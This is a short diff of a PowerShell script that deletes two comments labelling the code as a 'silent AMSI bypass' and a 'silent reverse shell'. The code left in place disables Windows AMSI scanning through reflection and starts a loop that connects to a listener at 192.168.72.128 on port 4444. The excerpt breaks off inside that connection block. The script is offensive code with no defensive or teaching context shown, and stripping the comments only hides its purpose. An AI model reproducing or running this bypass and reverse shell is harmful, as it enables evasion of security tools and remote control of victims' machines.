@@ -1,10 +1,8 @@
 $ip = "192.168.72.128"
 $port = 4444
 
-# Silent AMSI bypass
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# Immediate silent reverse shell (no persistence, no admin needed)
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
